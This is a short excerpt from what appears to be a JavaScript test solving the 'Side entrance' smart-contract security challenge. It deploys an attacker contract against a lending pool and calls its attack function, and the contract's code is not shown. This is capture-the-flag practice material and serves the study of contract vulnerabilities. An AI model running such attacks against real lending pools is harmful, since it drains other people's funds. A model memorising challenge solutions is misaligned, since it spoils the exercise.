...
describe("[Challenge] Side entrance", function () {
  ...
  it("Execution", async function () {
    ...
    let attacker_factory = await ethers.getContractFactory(
      "Attacker_sideetrance",
      player
    );
    let attacker = await attacker_factory.deploy(pool.address);
    let player_connected = await attacker.connect(player);
    let attack_tx = await player_connected.attack();
    // let withdraw = await pool.withdraw();
  });
